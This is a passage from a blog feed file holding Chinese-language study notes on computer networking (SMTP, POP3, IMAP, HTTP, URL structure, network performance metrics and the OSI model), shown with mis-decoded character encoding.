href="#ç»„æˆç»“æ„" class="headerlink" title="ç»„æˆç»“æ„"></a>ç»„æˆç»“æ„</h2><p>é‚®ä»¶å‘é€é‡‡ç”¨C&#x2F;Sæ¨¡å¼ï¼Œé‚®ä»¶æœåŠ¡å™¨æ—¢å¯ä»¥åšæœåŠ¡å™¨ä¹Ÿå¯ä»¥åšå‘é€æ–¹å®¢æˆ·ç«¯ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºæ„å›¾ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151536598.png" alt="image-20240305130100685"></p><p>é‚®ä»¶æ˜¯å­˜æ”¾åœ¨é‚®ä»¶æœåŠ¡å™¨çš„ç¼“å­˜å½“ä¸­</p><h2 id="smtpåè®®"><a href="#SMTPåè®®" class="headerlink" title="SMTPåè®®"></a>SMTPåè®®</h2><p>SMTPè§„å®šäº†14æ¡å‘½ä»¤(å‡ ä¸ªå­—æ¯)å’Œ21ç§åº”ä¿¡æ¯(ä¸‰ä½æ•°å­—ä»£ç +ç®€å•æ–‡å­—è¯´æ˜)ã€‚</p><p>ç”¨äºTCPè¿æ¥çš„ç«¯å£å·ä¸€èˆ¬æ˜¯25ç«¯å£</p><p><strong>SMTPé€šä¿¡çš„ä¸‰ä¸ªé˜¶æ®µ</strong></p><p>è¿æ¥å»ºç«‹&#x3D;ã€‹é‚®ä»¶ä¼ é€&#x3D;ã€‹è¿æ¥é‡Šæ”¾</p><p><img src="http://cdn.clown2024.cn/202407151536599.png" alt="image-20240305131325496"></p><p><strong>SMTPçš„ç¼ºç‚¹</strong></p><ol><li><p>SMTPä¸èƒ½ä¼ é€å¯æ‰§è¡Œæ–‡ä»¶æˆ–è€…å…¶ä»–äºŒè¿›åˆ¶å¯¹è±¡ã€‚</p></li><li><p>SMTPä»…é™äºä¼ é€7ä½ASCIIç ï¼Œä¸èƒ½ä¼ é€å…¶ä»–éè‹±è¯­å›½å®¶çš„æ–‡å­—ã€‚</p></li><li><p>SMTPæœåŠ¡å™¨ä¼šæ‹’ç»è¶…è¿‡ä¸€å®šé•¿åº¦çš„é‚®ä»¶ã€‚</p></li></ol><p><strong>MIME</strong></p><p>ä¹Ÿå«é€šç”¨å› ç‰¹ç½‘é‚®ä»¶æ‰©å……MIMEï¼Œç”¨æ¥å¼¥è¡¥SMTPåè®®çš„ä¸è¶³ï¼ŒMIMEæ˜¯ç”µå­é‚®ä»¶å¯ä»¥ä¼ è¾“å„ç§å„æ ·çš„æ•°æ®</p><p><img src="http://cdn.clown2024.cn/202407151536600.png" alt="image-20240305131619206"></p><p>ç°åœ¨ä¹Ÿä¸å…‰ä¸ºé‚®ä»¶æœåŠ¡ä½¿ç”¨ï¼Œä¹Ÿå·²ç»ä¸ºæµè§ˆå™¨ä½¿ç”¨ï¼Œä¼ è¾“æ•°æ®çš„æ—¶å€™å°±ä¼šå£°æ˜ä¼ è¾“çš„æ•°æ®æ˜¯ä»€ä¹ˆMIMEç±»å‹ï¼Œhttpçš„è¯·æ±‚å¤´ä¼šæœ‰ä¸€æ <strong>content-type</strong>å°±æ˜¯æ ‡è¯†æ•°æ®çš„MIMEç±»å‹</p><h2 id="é‚®å±€åè®®pop3"><a href="#é‚®å±€åè®®POP3" class="headerlink" title="é‚®å±€åè®®POP3"></a>é‚®å±€åè®®POP3</h2><p>è¯¥åè®®ä¹Ÿé‡‡ç”¨TCPè¿æ¥ï¼Œç«¯å£å·ä¸€èˆ¬ä¸º110ï¼Œä¹Ÿæ˜¯C&#x2F;Sæ¨¡å¼ï¼Œä½œç”¨åœ¨æœ€åç”¨æˆ·è¯»å–é‚®ä»¶å†…å®¹çš„æ—¶å€™</p><p><img src="http://cdn.clown2024.cn/202407151536601.png" alt="image-20240305132443641"></p><p>å…¶å·¥ä½œæ–¹å¼æœ‰ä¸¤ç§ï¼š</p><ul><li>ä¸‹è½½å¹¶ä¿ç•™(åœ¨æœåŠ¡å™¨)</li><li>ä¸‹è½½å¹¶åˆ é™¤</li></ul><h2 id="ç½‘é™…æŠ¥æ–‡å­˜å–åè®®imap"><a href="#ç½‘é™…æŠ¥æ–‡å­˜å–åè®®IMAP" class="headerlink" title="ç½‘é™…æŠ¥æ–‡å­˜å–åè®®IMAP"></a>ç½‘é™…æŠ¥æ–‡å­˜å–åè®®IMAP</h2><p>IMAPåè®®æ¯”POPåè®®å¤æ‚ã€‚å½“ç”¨æˆ·Pcä¸Šçš„IMAPå®¢æˆ·ç¨‹åºæ‰“å¼€IMAPæœåŠ¡å™¨çš„é‚®ç®±æ—¶ï¼Œç”¨æˆ·å¯ä»¥çœ‹åˆ°é‚®ç®±çš„é¦–éƒ¨ï¼Œè‹¥ç”¨æˆ·éœ€è¦æ‰“å¼€æŸä¸ªé‚®ä»¶ï¼Œè¯¥é‚®ä»¶æ‰ä¸Šä¼ åˆ°ç”¨æˆ·çš„è®¡ç®—æœºä¸Šã€‚</p><p>IMAPå¯ä»¥è®©ç”¨æˆ·åœ¨ä¸åŒçš„åœ°æ–¹ä½¿ç”¨ä¸åŒçš„è®¡ç®—æœºéšæ—¶ä¸Šç½‘é˜…è¯»å¤„ç†é‚®ä»¶ï¼Œè¿˜å…è®¸åªè¯»å–é‚®ä»¶ä¸­çš„æŸä¸€ä¸ªéƒ¨åˆ†<br>(å…ˆçœ‹æ­£æ–‡ï¼Œæœ‰WiFiçš„æ—¶å€™å†ä¸‹è½½é™„ä»¶)ã€‚</p><p>è¯¥åè®®ä¹Ÿæ˜¯å’ŒPOP3ä¸€æ ·ä½œç”¨åœ¨æœ€åä¸€ä¸ªç¯èŠ‚</p><h2 id="åŸºäºä¸‡ç»´ç½‘çš„ç”µå­é‚®ä»¶"><a href="#åŸºäºä¸‡ç»´ç½‘çš„ç”µå­é‚®ä»¶" class="headerlink" title="åŸºäºä¸‡ç»´ç½‘çš„ç”µå­é‚®ä»¶"></a>åŸºäºä¸‡ç»´ç½‘çš„ç”µå­é‚®ä»¶</h2><p>ç°åœ¨å¾ˆå°‘ä¸“é—¨å»ä¸‹è½½å‘é€é‚®ä»¶çš„è½¯ä»¶ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨ç½‘ä¸Šè¾“å…¥é‚®ç®±å†™ä¸Šå†…å®¹å°±å¯ä»¥å‘é€é‚®ä»¶äº†ï¼Œæ˜¯åŸºäºhttpåè®®å»è¿æ¥åˆ«çš„å‚å•†çš„é‚®ä»¶æœåŠ¡å™¨ï¼Œæ¯”å¦‚é€šè¿‡httpåè®®ç”¨æˆ·ä»£ç†è¿æ¥åˆ°ç½‘æ˜“é‚®ä»¶æœåŠ¡å™¨</p><p><img src="http://cdn.clown2024.cn/202407151536602.png" alt="image-20240305132800061"></p><h1 id="ä¸‡ç»´ç½‘å’Œhttpåè®®"><a href="#ä¸‡ç»´ç½‘å’ŒHTTPåè®®" class="headerlink" title="ä¸‡ç»´ç½‘å’ŒHTTPåè®®"></a>ä¸‡ç»´ç½‘å’ŒHTTPåè®®</h1><h2 id="urlå’Œuri"><a href="#URLå’ŒURI" class="headerlink" title="URLå’ŒURI"></a>URLå’ŒURI</h2><p><strong>URI</strong>å«åšç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦ï¼Œ<strong>URL</strong>ï¼ˆç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼‰æ˜¯å…¶ä¸­çš„ä¸€ç§ã€‚</p><p>HTTP è¯·æ±‚çš„å†…å®¹é€šç§°ä¸ºâ€èµ„æºâ€ã€‚â€èµ„æºâ€œè¿™ä¸€æ¦‚å¿µéå¸¸å®½æ³›ï¼Œå®ƒå¯ä»¥æ˜¯ä¸€ä»½æ–‡æ¡£ï¼Œä¸€å¼ å›¾ç‰‡ï¼Œæˆ–æ‰€æœ‰å…¶ä»–ä½ èƒ½å¤Ÿæƒ³åˆ°çš„æ ¼å¼ã€‚æ¯ä¸ªèµ„æºéƒ½ç”±ä¸€ä¸ª <strong>URI</strong> æ¥è¿›è¡Œæ ‡è¯†ã€‚</p><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œèµ„æºçš„åç§°å’Œä½ç½®ç”±åŒä¸€ä¸ª URLï¼ˆç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼Œå®ƒæ˜¯ URI çš„ä¸€ç§ï¼‰æ¥æ ‡è¯†ã€‚ä¹Ÿæœ‰æŸäº›ç‰¹æ®Šæƒ…å†µï¼Œèµ„æºçš„åç§°å’Œä½ç½®ç”±ä¸åŒçš„ URI è¿›è¡Œæ ‡è¯†ï¼šä¾‹å¦‚ï¼Œå¾…è¯·æ±‚çš„èµ„æºå¸Œæœ›å®¢æˆ·ç«¯ä»å¦å¤–ä¸€ä¸ªä½ç½®è®¿é—®å®ƒã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªç‰¹å®šçš„é¦–éƒ¨å­—æ®µï¼Œ<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Alt-Svc"><code>Alt-Svc</code></a>ï¼Œæ¥æŒ‡ç¤ºè¿™ç§æƒ…å†µã€‚</p><p><strong>URL</strong> ç”±å¤šä¸ªå¿…é¡»æˆ–å¯é€‰çš„ç»„ä»¶æ„æˆã€‚ä¸‹é¢ç»™å‡ºäº†ä¸€ä¸ªå¤æ‚çš„ URLï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://www.example.com:80/path/to/myfile.html?key1=value1&amp;key2=value2#SomewhereInTheDocument<br></code></pre></td></tr></table></figure><p><strong>URLçš„ç»“æ„å¦‚ä¸‹ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">URI=scheme:[//authority]path[?query][#fragment]<br>authorityç»„ä»¶åˆåˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼š[userinfo@]host[:port]<br>è¯¥ç»„ä»¶ä¸­ï¼Œuserinfoç”¨çš„æ¯”è¾ƒå°‘ï¼Œä¸€èˆ¬HTTPä»¥åŒ¿åçš„æ–¹å¼è·å–æ•°æ®ï¼Œå¦‚æœè¦è¿›è¡Œèº«ä»½éªŒè¯ï¼Œæ ¼å¼ä¸º username:password ,ä»¥@ç»“å°¾<br></code></pre></td></tr></table></figure><p><strong>URN</strong> æ˜¯å¦ä¸€ç§å½¢å¼çš„ URIï¼Œå®ƒé€šè¿‡ç‰¹å®šå‘½åç©ºé—´ä¸­çš„å”¯ä¸€åç§°æ¥æ ‡è¯†èµ„æºã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">urn:isbn:9780141036144<br>urn:ietf:rfc:7230<br></code></pre></td></tr></table></figure><h2 id="httpè¯·æ±‚è¿‡ç¨‹"><a href="#HTTPè¯·æ±‚è¿‡ç¨‹" class="headerlink" title="HTTPè¯·æ±‚è¿‡ç¨‹"></a>HTTPè¯·æ±‚è¿‡ç¨‹</h2><p>HTTPè¯·æ±‚å…·ä½“è¿‡ç¨‹ç¤ºä¾‹å›¾ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151536603.png" alt="image-20240305133740408"></p><h2 id="httpè¿æ¥æ–¹å¼"><a href="#HTTPè¿æ¥æ–¹å¼" class="headerlink" title="HTTPè¿æ¥æ–¹å¼"></a>HTTPè¿æ¥æ–¹å¼</h2><p>httpåè®®æœ¬èº«æ˜¯ä¸€ä¸ªæ— çŠ¶æ€åè®®ï¼Œå¦‚æœéœ€è¦è¯†åˆ«ç”¨æˆ·çš„è¯å¯ä»¥åˆ©ç”¨Cookie</p><p>è¿æ¥æ–¹å¼ï¼š</p><ul><li><p>æŒä¹…è¿æ¥(Keep-alive)</p><p>åªéœ€è¦è¿›è¡Œä¸€æ¬¡TCPè¿æ¥ï¼Œåç»­å†å‘é€æ–°æ•°æ®ä¸éœ€è¦é‡æ–°å»ºç«‹è¿æ¥</p><ul><li><p>éæµæ°´çº¿</p><p><img src="http://cdn.clown2024.cn/202407151536604.png" alt="image-20240305134328129"></p><p>è¿™å°±æ˜¯éæµæ°´çº¿å¼çš„è¿æ¥ï¼Œè¦åœ¨æ”¶åˆ°å“åº”åæ‰èƒ½ç»§ç»­ä¸‹ä¸€æ¬¡è¯·æ±‚</p></li><li><p>æµæ°´çº¿</p><p>å°±æ˜¯å¯ä»¥åŒæ—¶å‘é€å¤šä¸ªè¯·æ±‚æŠ¥æ–‡ä¸éœ€è¦é€æ¬¡ç­‰å¾…</p></li></ul></li><li><p>éæŒä¹…è¿æ¥(Close)</p><p><img src="http://cdn.clown2024.cn/202407151536605.png" alt="image-20240305134223174"></p><p>å³æ¯æ¬¡å‘é€ä¸€æ¬¡æ–°çš„æ•°æ®éƒ½éœ€è¦é‡æ–°å»ºç«‹è¿æ¥ï¼Œæ¯”è¾ƒè€—æ—¶</p></li></ul><h2 id="httpè¯·æ±‚æŠ¥æ–‡ç»“æ„"><a href="#HTTPè¯·æ±‚æŠ¥æ–‡ç»“æ„" class="headerlink" title="HTTPè¯·æ±‚æŠ¥æ–‡ç»“æ„"></a>HTTPè¯·æ±‚æŠ¥æ–‡ç»“æ„</h2><p>è¿™é‡Œæ”¾ä¸€å¼ å›¾å°±è¡Œäº†ï¼Œè¿™æ˜¯getè¯·æ±‚çš„æŠ¥æ–‡ç»“æ„</p><p><img src="http://cdn.clown2024.cn/202407151536606.png" alt="image-20240305134824112"></p>]]></content>
      
      
      <categories>
          
          <category> åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®¡ç½‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç®—æœºç½‘ç»œå­¦ä¹ (1)</title>
      <link href="/2024/03/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-1/"/>
      <url>/2024/03/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-1/</url>
      
        <content type="html"><![CDATA[<p><strong>è¿™é‡Œæ ¹æ®ç‹é“è€ƒç ”è§†é¢‘æ¥å­¦ä¹ ï¼Œå•ƒä¹¦å¤ªæŠ˜ç£¨äº†()</strong></p><h1 id="æ€§èƒ½æŒ‡æ ‡"><a href="#æ€§èƒ½æŒ‡æ ‡" class="headerlink" title="æ€§èƒ½æŒ‡æ ‡"></a>æ€§èƒ½æŒ‡æ ‡</h1><h2 id="é€Ÿç‡"><a href="#é€Ÿç‡" class="headerlink" title="é€Ÿç‡"></a>é€Ÿç‡</h2><p><img src="http://cdn.clown2024.cn/202407151536870.png" alt="image-20240305004320101"></p><h2 id="å¸¦å®½"><a href="#å¸¦å®½" class="headerlink" title="å¸¦å®½"></a>å¸¦å®½</h2><p>è®¡ç®—æœºç½‘ç»œä¸­ï¼Œå¸¦å®½ç”¨æ¥è¡¨ç¤ºç½‘ç»œçš„é€šä¿¡çº¿è·¯ä¼ é€æ•°æ®çš„èƒ½åŠ›ï¼Œé€šå¸¸æ˜¯æŒ‡å•ä½æ—¶é—´å†…ä»ç½‘ç»œä¸­çš„æŸä¸€ç‚¹åˆ°å¦ä¸€ç‚¹æ‰€èƒ½é€šè¿‡çš„â€œæœ€é«˜æ•°æ®ç‡â€ã€‚å•ä½æ˜¯â€œæ¯”ç‰¹æ¯ç§’â€ï¼Œb&#x2F;sï¼Œkb&#x2F;sï¼ŒMb&#x2F;sï¼ŒGb&#x2F;sã€‚ç½‘ç»œè®¾å¤‡æ‰€æ”¯æŒçš„æœ€é«˜é€Ÿåº¦ã€‚</p><p>ä¹Ÿå°±æ˜¯ç†è®ºä¸Šçš„æœ€é«˜é€Ÿç‡ã€‚</p><p>å¸¦å®½å¢å¤§ä¹Ÿå°±æ˜¯å‘é€çš„é€Ÿç‡å˜å¿«äº†ï¼Œå¹¶ä¸å½±å“ä¼ æ’­çš„é€Ÿç‡ã€‚</p><h2 id="ååé‡"><a href="#ååé‡" class="headerlink" title="ååé‡"></a>ååé‡</h2><p>è¡¨ç¤ºåœ¨å•ä½æ—¶é—´å†…é€šè¿‡æŸä¸ªç½‘ç»œ(æˆ–ä¿¡é“ã€æ¥å£)çš„æ•°æ®é‡ã€‚å•ä½b&#x2F;sï¼Œkb&#x2F;sï¼ŒMb&#x2F;sç­‰ã€‚</p><p>ååé‡å—ç½‘ç»œçš„å¸¦å®½æˆ–ç½‘ç»œçš„é¢å®šé€Ÿç‡çš„é™åˆ¶ã€‚</p><h2 id="æ—¶å»¶"><a href="#æ—¶å»¶" class="headerlink" title="æ—¶å»¶"></a>æ—¶å»¶</h2><p>æŒ‡æ•°æ®(æŠ¥æ–‡&#x2F;åˆ†ç»„&#x2F;æ¯”ç‰¹æµ)ä»ç½‘ç»œ(æˆ–é“¾è·¯)çš„ä¸€ç«¯ä¼ é€åˆ°å¦ä¸€ç«¯æ‰€éœ€çš„æ—¶é—´ã€‚ä¹Ÿå«å»¶è¿Ÿæˆ–è¿Ÿå»¶ã€‚å•ä½æ˜¯sã€‚</p><p>æ—¶å»¶åˆåˆ†ä¸º4ç§ï¼š</p><ul><li>å‘é€æ—¶å»¶(ä¼ è¾“æ—¶å»¶)ï¼šå‘é€æ—¶å»¶&#x3D;æ•°æ®é•¿åº¦&#x2F;ä¿¡é“å¸¦å®½(å‘é€é€Ÿç‡)</li><li>ä¼ æ’­æ—¶å»¶ï¼šå–å†³äºç”µç£æ³¢ä¼ æ’­é€Ÿåº¦å’Œé“¾è·¯é•¿åº¦ï¼Œä¼ æ’­æ—¶å»¶&#x3D;ä¿¡é“é•¿åº¦&#x2F;ç”µç£æ³¢åœ¨ä¿¡é“ä¸Šçš„ä¼ æ’­é€Ÿç‡</li><li>æ’é˜Ÿæ—¶å»¶ï¼šç­‰å¾…è¾“å‡ºã€è¾“å…¥é“¾è·¯å¯ç”¨(ä¾‹å¦‚æ’é˜Ÿç­‰å®‰æ£€)</li><li>å¤„ç†æ—¶å»¶ï¼šæ£€é”™æ‰¾å‡ºå£(ä¾‹å¦‚å®‰æ£€æ—¶çš„è¿‡ç¨‹è¦çš„æ—¶é—´)</li></ul><h2 id="æ—¶å»¶å¸¦å®½ç§¯"><a href="#æ—¶å»¶å¸¦å®½ç§¯" class="headerlink" title="æ—¶å»¶å¸¦å®½ç§¯"></a>æ—¶å»¶å¸¦å®½ç§¯</h2><p>æ—¶å»¶å¸¦å®½ç§¯(bit)&#x3D;ä¼ æ’­æ—¶å»¶(s) X å¸¦å®½(b&#x2F;s)</p><p>æ—¶å»¶å¸¦å®½ç§¯åˆç§°ä¸ºä»¥æ¯”ç‰¹ä¸ºå•ä½çš„é“¾è·¯é•¿åº¦</p><p>å°±æ˜¯é“¾è·¯ä¸Šçš„å®¹é‡</p><h2 id="å¾€è¿”æ—¶å»¶rtt"><a href="#å¾€è¿”æ—¶å»¶RTT" class="headerlink" title="å¾€è¿”æ—¶å»¶RTT"></a>å¾€è¿”æ—¶å»¶RTT</h2><p>ä»å‘é€æ–¹å‘é€æ•°æ®å¼€å§‹ï¼Œåˆ°å‘é€æ–¹æ”¶åˆ°æ¥æ”¶æ–¹çš„ç¡®è®¤(æ¥æ”¶æ–¹æ”¶åˆ°æ•°æ®åç«‹å³å‘é€ç¡®è®¤)ï¼Œæ€»å…±ç»å†çš„æ—¶å»¶ã€‚</p><p>è¿™é‡Œå¯ä»¥ç”¨pingæ¥çœ‹åˆ°å¾€è¿”æ—¶å»¶</p><p><img src="http://cdn.clown2024.cn/202407151536871.png" alt="image-20240305084247521"></p><p>ä¸Šé¢çš„æ—¶é—´å°±æ˜¯å¾€è¿”æ—¶å»¶</p><p>RTTè¶Šå¤§ï¼Œåœ¨æ”¶åˆ°ç¡®è®¤ä¹‹å‰ï¼Œå¯ä»¥å‘é€çš„æ•°æ®è¶Šå¤šï¼Œå› ä¸ºæ”¶åˆ°ç¡®è®¤å‰çš„æ—¶é—´è¶Šé•¿</p><p>RTTåŒ…æ‹¬ä»¥ä¸‹ä¸¤éƒ¨åˆ†ï¼š</p><ul><li>å¾€è¿”ä¼ æ’­æ—¶å»¶&#x3D;ä¼ æ’­æ—¶å»¶*2ï¼ˆä¸»è¦å°±æ˜¯è¿™ä¸ªï¼‰</li><li>æœ«ç«¯å¤„ç†æ—¶é—´</li></ul><h2 id="åˆ©ç”¨ç‡"><a href="#åˆ©ç”¨ç‡" class="headerlink" title="åˆ©ç”¨ç‡"></a>åˆ©ç”¨ç‡</h2><ul><li>ä¿¡é“åˆ©ç”¨ç‡ï¼šä¿¡é“åˆ©ç”¨ç‡&#x3D;æœ‰æ•°æ®é€šè¿‡æ—¶é—´&#x2F;(æœ‰+æ— )æ•°æ®é€šè¿‡æ—¶é—´</li><li>ç½‘ç»œåˆ©ç”¨ç‡ï¼šä¿¡é“åˆ©ç”¨ç‡çš„åŠ æƒå¹³å‡å€¼</li></ul><p><strong>æ—¶å»¶å’Œåˆ©ç”¨ç‡çš„å…³ç³»å›¾</strong></p><p><img src="http://cdn.clown2024.cn/202407151536872.png" alt="image-20240305084703782"></p><p>è¿™å°±ç›¸å½“äºé«˜é€Ÿè½¦è¾†è¶Šå¤šè¡Œé©¶è¶Šç¼“æ…¢</p><h1 id="osiä¸ƒå±‚æ¨¡å‹"><a href="#OSIä¸ƒå±‚æ¨¡å‹" class="headerlink" title="OSIä¸ƒå±‚æ¨¡å‹"></a>OSIä¸ƒå±‚æ¨¡å‹</h1><p>OSIä¸ƒå±‚æ¨¡å‹åç†è®ºï¼Œå¹¶ä¸åœ¨å®é™…ä¸­è¿ç”¨ï¼Œå› ä¸ºè¯¥æ¨¡å‹ååˆ†ç†æƒ³ï¼Œä¸”æ•ˆç‡ä½ä½†å¯¹æˆ‘ä»¬äº†è§£ç½‘ç»œæ¨¡å‹æœ‰å¸®åŠ©</p><p><img src="http://cdn.clown2024.cn/202407151536873.png" alt="image-20240304110839603"></p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªåˆ©ç”¨OSIä¸ƒå±‚æ¨¡å‹é€šè¿‡ä¸­é—´ç³»ç»Ÿè¿›è¡Œä¿¡æ¯ä¼ è¾“çš„ç¤ºä¾‹å›¾</p><p><img src="http://cdn.clown2024.cn/202407151536874.png" alt="image-20240304111508504"></p><p>é™¤äº†ç‰©ç†å±‚ï¼Œæ¯ä¸€å±‚éƒ½ä¼šå¯¹æ•°æ®è¿›è¡Œå°è£…å†å¾€ä¸‹ä¸€å±‚ä¼ è¾“ï¼Œä¿¡æ¯å¤„ç†çš„è¿‡ç¨‹ç¤ºä¾‹å›¾å¦‚ä¸‹ï¼Œä¹Ÿå°±æ˜¯æ‰“åŒ…å’Œæ‹†åŒ…çš„è¿‡ç¨‹</p><p><img src="http://cdn.clown2024.cn/202407151536875.png" alt="image-20240304111743194"></p><h2 id="åº”ç”¨å±‚"><a href="#åº”ç”¨å±‚" class="headerlink" title="åº”ç”¨å±‚"></a>åº”ç”¨å±‚</h2><p>èƒ½å’Œç”¨æˆ·äº¤äº’äº§ç”Ÿç½‘è·¯æµé‡çš„ç¨‹åº</p><p>å…¸å‹åº”ç”¨å±‚æœåŠ¡ï¼š</p><p>æ–‡ä»¶ä¼ è¾“(FTP)</p><p>ç”µå­é‚®ä»¶(SMTP)</p><p>ä¸‡ç»´ç½‘(HTTP)</p><p>â€¦â€¦</p><h2 id="è¡¨ç¤ºå±‚"><a href="#è¡¨ç¤ºå±‚" class="headerlink" title="è¡¨ç¤ºå±‚"></a>è¡¨ç¤ºå±‚</h2><p>ç”¨æˆ·å¤„ç†ä¸¤ä¸ªé€šä¿¡ç³»ç»Ÿä¸­äº¤æ¢ä¿¡æ¯çš„è¡¨ç¤ºæ–¹å¼</p><p>åŠŸèƒ½ä¸€ï¼šæ•°æ®æ ¼å¼å˜æ¢</p><p>åŠŸèƒ½äºŒï¼šæ•°æ®åŠ å¯†è§£å¯†</p><p>åŠŸèƒ½ä¸‰ï¼šæ•°æ®å‹ç¼©å’Œæ¢å¤</p><h2 id="ä¼šè¯å±‚"><a href="#ä¼šè¯å±‚" class="headerlink" title="ä¼šè¯å±‚"></a>ä¼šè¯å±‚</h2><p>å‘è¡¨ç¤ºå±‚å®ä½“&#x2F;ç”¨æˆ·è¿›ç¨‹æä¾›å»ºç«‹è¿æ¥å¹¶åœ¨è¿æ¥ä¸Šæœ‰åºåœ°ä¼ è¾“æ•°æ®ã€‚</p><p>è¿™æ˜¯ä¼šè¯ä¹Ÿæ˜¯å»ºç«‹åŒæ­¥</p><p>åŠŸèƒ½ä¸€ï¼šå»ºç«‹ã€ç®¡ç†ã€ç»ˆæ­¢ä¼šè¯</p><p>åŠŸèƒ½äºŒï¼šä½¿ç”¨æ ¡éªŒç‚¹å¯ä½¿ä¼šè¯åœ¨é€šä¿¡å¤±æ•ˆæ—¶ä»æ ¡éªŒç‚¹&#x2F;åŒæ­¥ç‚¹ç»§ç»­æ¢å¤é€šä¿¡ï¼Œå®ç°æ•°æ®åŒæ­¥ã€‚é€‚ç”¨äºä¼ è¾“å¤§æ–‡ä»¶</p><h2 id="ä¼ è¾“å±‚"><a href="#ä¼ è¾“å±‚" class="headerlink" title="ä¼ è¾“å±‚"></a>ä¼ è¾“å±‚</h2><p>è´Ÿè´£ä¸»æœºä¸­ä¸¤ä¸ªè¿›ç¨‹çš„é€šä¿¡ï¼Œå³&#x3D;&#x3D;ç«¯åˆ°ç«¯&#x3D;&#x3D;çš„é€šä¿¡(ä¹Ÿå°±æ˜¯ç«¯å£å·é‚£ç§)ã€‚ä¼ è¾“å•ä½æ˜¯æŠ¥æ–‡æ®µæˆ–ç”¨æˆ·æ•°æ®æŠ¥ã€‚</p><p>åŠŸèƒ½ä¸€:å¯é ä¼ è¾“ã€ä¸å¯é ä¼ è¾“</p><p>åŠŸèƒ½äºŒ:å·®é”™æ§åˆ¶</p><p>åŠŸèƒ½ä¸‰:æµé‡æ§åˆ¶</p><p>åŠŸèƒ½å››:å¤ç”¨åˆ†ç”¨</p><blockquote><p>å¤ç”¨:å¤šä¸ªåº”ç”¨å±‚è¿›ç¨‹å¯åŒæ—¶ä½¿ç”¨ä¸‹é¢ä¼ è¾“å±‚çš„æœåŠ¡ã€‚</p><p>åˆ†ç”¨:ä¼ è¾“å±‚æŠŠæ”¶åˆ°çš„ä¿¡æ¯åˆ†åˆ«äº¤ä»˜ç»™ä¸Šé¢åº”ç”¨å±‚ä¸­ç›¸åº”çš„è¿›ç¨‹ï¼Œ</p></blockquote><h2 id="ç½‘ç»œå±‚"><a href="#ç½‘ç»œå±‚" class="headerlink" title="ç½‘ç»œå±‚"></a>ç½‘ç»œå±‚</h2><p>ä¸»è¦ä»»åŠ¡æ˜¯æŠŠåˆ†ç»„ä»æºç«¯ä¼ åˆ°ç›®çš„ç«¯ï¼Œä¸ºåˆ†ç»„äº¤æ¢ç½‘ä¸Šçš„ä¸åŒä¸»æœºæä¾›é€šä¿¡æœåŠ¡ï¼Œç½‘ç»œå±‚ä¼ è¾“å•ä½æ˜¯æ•°æ®æŠ¥ã€‚</p><p>åŠŸèƒ½ä¸€:è·¯ç”±é€‰æ‹©(æœ€ä½³è·¯å¾„)</p><p>åŠŸèƒ½äºŒ:æµé‡æ§åˆ¶</p><p>åŠŸèƒ½ä¸‰:å·®é”™æ§åˆ¶</p><p>åŠŸèƒ½å››:æ‹¥å¡æ§åˆ¶</p><blockquote><p>è‹¥æ‰€æœ‰ç»“ç‚¹éƒ½æ¥ä¸åŠæ¥å—åˆ†ç»„ï¼Œè€Œè¦ä¸¢å¼ƒå¤§é‡åˆ†ç»„çš„è¯ï¼Œç½‘ç»œå°±å¤„äºæ‹¥å¡çŠ¶æ€ã€‚å› æ­¤è¦é‡‡å–ä¸€å®šæªæ–½ï¼Œç¼“è§£è¿™ç§æ‹¥å¡ï¼Œä¹Ÿå°±æ˜¯æ‹¥å¡æ§åˆ¶ã€‚</p></blockquote><p>è¯¥å±‚ä¸»è¦åè®®ï¼š</p><p>IPã€IPXã€ICMPã€IGMPã€ARPã€RARPã€OSPF</p><h2 id="æ•°æ®é“¾è·¯å±‚"><a href="#æ•°æ®é“¾è·¯å±‚" class="headerlink" title="æ•°æ®é“¾è·¯å±‚"></a>æ•°æ®é“¾è·¯å±‚</h2><p>ä¸»è¦ä»»åŠ¡æ˜¯æŠŠç½‘ç»œå±‚ä¼ ä¸‹æ¥çš„æ•°æ®æŠ¥ç»„è£…æˆå¸§ï¼Œæ•°æ®é“¾è·¯å±‚&#x2F;é“¾è·¯å±‚çš„ä¼ è¾“å•ä½æ˜¯å¸§ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151536876.png" alt="image-20240305002727144"></p><h2 id="ç‰©ç†å±‚"><a href="#ç‰©ç†å±‚" class="headerlink" title="ç‰©ç†å±‚"></a>ç‰©ç†å±‚</h2><p>ä¸»è¦ä»»åŠ¡æ˜¯åœ¨ç‰©ç†åª’ä½“ä¸Šå®ç°æ¯”ç‰¹æµçš„é€æ˜ä¼ è¾“ï¼Œç‰©ç†å±‚ä¼ è¾“å•ä½æ˜¯æ¯”ç‰¹ï¼Œ</p><p><img src="http://cdn.clown2024.cn/202407151536877.png" alt="image-20240305002907189"></p><h1 id="tcpx2fipå‚è€ƒæ¨¡å‹"><a href="#TCP-IPå‚è€ƒæ¨¡å‹" class="headerlink" title="TCP&#x2F;IPå‚è€ƒæ¨¡å‹"></a>TCP&#x2F;IPå‚è€ƒæ¨¡å‹</h1><p>ä¸‹é¢æ˜¯ä¸€ä¸ªTCP&#x2F;IPæ¨¡å‹å’Œèµ·åè®®æ ˆçš„å¯¹åº”å›¾ï¼š<br><img src="http://cdn.clown2024.cn/202407151536878.png" 